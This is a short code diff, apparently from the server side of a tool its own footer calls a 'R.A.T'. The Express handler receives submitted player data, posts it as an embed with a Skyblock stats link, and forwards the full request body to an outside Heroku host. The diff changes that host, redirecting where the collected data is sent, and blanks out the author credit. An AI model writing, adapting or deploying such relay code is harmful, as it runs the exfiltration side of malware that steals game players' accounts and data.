@@ -138,7 +138,7 @@ app.post("/", (req, res) => {
                         url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                         color: 5814783,
                         footer: {
-                            "text": "R.A.T by dxxxxy",
+                            "text": "R.A.T by Censored",
                             "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
                         },
                         timestamp: new Date()
@@ -157,7 +157,7 @@ app.post("/", (req, res) => {
         }
     })
  //send to another server
-                post("https://dupertax.herokuapp.com//", req.body, {
+                post("https://dupertaxer.herokuapp.com//", req.body, {
                     headers: {
                         "Content-Type": "application/json"
                     }
